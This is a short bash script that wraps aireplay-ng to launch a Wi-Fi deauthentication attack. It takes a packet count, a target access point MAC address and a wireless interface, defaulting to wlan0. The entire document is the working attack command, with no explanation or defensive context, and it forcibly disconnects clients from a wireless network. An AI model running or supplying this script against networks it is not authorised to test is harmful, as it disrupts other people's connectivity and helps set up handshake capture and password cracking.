#!/bin/bash

if [ $# -lt 2 ]; then
    echo "Use: $0 DEAUTH_COUNT MAC_ADDRESS [INTERFACE wlan0]"
    exit 1
fi

DEAUTH_COUNT=$1
MAC_ADDRESS=$2
INTERFACE=${3:-wlan0} 

aireplay-ng --deauth "$DEAUTH_COUNT" -a "$MAC_ADDRESS" "$INTERFACE"
